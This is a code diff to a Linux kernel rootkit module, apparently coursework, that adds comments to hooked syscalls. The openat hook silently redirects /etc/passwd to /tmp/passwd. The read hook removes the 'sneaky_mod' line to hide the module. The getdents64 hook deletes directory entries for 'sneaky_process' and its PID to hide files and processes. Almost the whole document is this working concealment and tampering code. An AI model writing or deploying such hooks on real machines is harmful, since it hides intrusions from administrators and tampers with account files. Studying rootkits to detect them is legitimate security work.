@@ -51,8 +51,10 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   char * orignal_name = "/etc/passwd\0";
   int n = original_openat(regs);
   char * filename = (char *)regs->si;
-
+  
+  //found the filename we want 
   if(strcmp(filename, orignal_name) == 0){
+    //redirect to our file 
     copy_to_user(regs->si, "/tmp/passwd", sizeof("/tmp/passwd"));
     return original_openat(regs);
   }
@@ -62,15 +64,25 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 asmlinkage int (*original_read)(struct pt_regs * regs);
 
 asmlinkage int sneaky_read(struct pt_regs * regs){
+  //original no of read bytes
   int n = original_read(regs);
+  //get read buffer
   char __user * buf = (char *)regs->si;
-
+   
+  //check if buf contains sneaky_mod line
   char * line = strstr(buf, "sneaky_mod");
   if(line != NULL){
+    //get ending buffer loc, after sneaky_mod
     char * end = strchr(line, '\n');
     if(end != NULL){
+      //get to the next line, skipping \n
       end += 1;
+      //move rest of memory, removing sneaky_mod
+      //use char __user * -> get in user memory location 
       memmove(line, end, (char __user *)(buf + n) - (end));
+
+      
+      //reduce length of line
       n -= end - line;
     }
   }
@@ -84,8 +96,12 @@ asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 //sneaky version of fxn
 asmlinkage int sneaky_getdents64(struct pt_regs * regs){
     int i = 0;
+    //get directory/files structure
     struct linux_dirent64 __user *dirp = (struct linux_dirent64 *)regs->si;
+    //get no of bytes read originally
     int n_bytes = original_getdents64(regs);
+
+    //pointer to traverse file/dir structure
     struct linux_dirent64 * d = dirp;
 
     char pid_str[10];
@@ -93,15 +109,22 @@ asmlinkage int sneaky_getdents64(struct pt_regs * regs){
   
     while(i < n_bytes){
     
+      //found the file name/Process id to remove
       if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0){
         //copy rest of dirp into curr 
+
+        //get next file/dir memory loc
         char * next = (char *)d + d->d_reclen;
+        //get len of rest of region
         int len = (int)dirp + n_bytes - (int) next;
+        //Move rest of dirp, skipping found file/dir
         memmove(d, next, len);
+        //update len of dir
         n_bytes -= d->d_reclen; 
         continue;
       }
       //printk(KERN_INFO "I: %d\n", i);
+      //next file/dir
       i += d->d_reclen;
       d = (struct linux_dirent64 *) ((char *)dirp + i);
 
